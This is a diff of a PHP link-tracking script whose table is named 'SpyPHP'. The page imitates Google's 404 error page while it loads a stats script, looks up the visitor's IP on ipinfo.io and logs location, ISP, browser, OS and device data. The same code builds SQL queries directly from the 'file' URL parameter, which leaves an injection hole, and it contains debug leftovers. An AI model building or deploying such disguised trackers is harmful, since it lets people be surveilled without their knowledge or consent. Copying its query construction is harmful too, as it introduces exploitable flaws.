@@ -2,12 +2,21 @@
 session_start();
 header('Content-Type: text/html; charset=utf-8');
 
-$access = htmlspecialchars($_GET["access"]);
-$tokenurl = "https://www.deinebibel.eu/confirm.php?token=$access";
-if (!$access) {
+require('./inc/inc_func.php');
+
+// Check for Parameters
+$file = htmlspecialchars($_GET["file"]);
+
+if (!$file) {
     exit();
 }
 
+// CHECK FOR EXISTING RECORD
+
+if (!checkForRecord($dbPath, $file)) {
+    echo "fuck!";
+    exit();
+}
 ?>
 
 <!DOCTYPE html>
@@ -26,18 +35,11 @@ if (!$access) {
 </head>
 
 <body>
-
-    <?php
-    require('./inc/inc_func.php');
-    require('./inc/inc_config.php');
-    ?>
-
     <script type="text/javascript" src="./js/stats.js"></script>
     <a href=//www.google.com /><span id=logo aria-label=Google></span></a>
     <p><b>404.</b> <ins>That’s an error.</ins>
     <p>The requested URL was not found on this server. <ins>That’s all we know.</ins>
 </body>
-
 </html>
 
 <?php
@@ -59,22 +61,20 @@ $ipinfo = json_decode(file_get_contents("https://ipinfo.io/{$clientIp}"));
 // $iporg = $ipinfo->org;
 // $ipprovider = "$iphost, ASN: $iporg";
 
-// INSERT INTO DB
+// UPDATE SQL RECORD
+
 $conn = new PDO("sqlite:" . $dbPath);
 $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$stmt = $conn->prepare("UPDATE $tableName SET Timestamp='$timeStamp' WHERE UrlId='$file';");
+$stmt->execute();
 
-$stmt = $conn->prepare("SELECT * FROM SpyPHP WHERE UrlId LIKE 'fuck';");
-$row = $stmt->fetch(PDO::FETCH_ASSOC);
-var_dump($row);
-// DIE IF RECORD ALREADY EXIST TO AVOID SPAMMING THE DB
-if ($row) {
-    exit();
-}
-
+die;
+$conn = new PDO("sqlite:" . "./admin/$dbPath");
+$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 $stmt = $conn->prepare("INSERT INTO $tableName (Timestamp, UrlId, IP, ISP, Country, City, Language, Browser, Resolution, OS, Device)
 VALUES (
     '$timeStamp',
-    '$access',
+    '$file',
     '$clientIp',
     NULL,
     NULL,
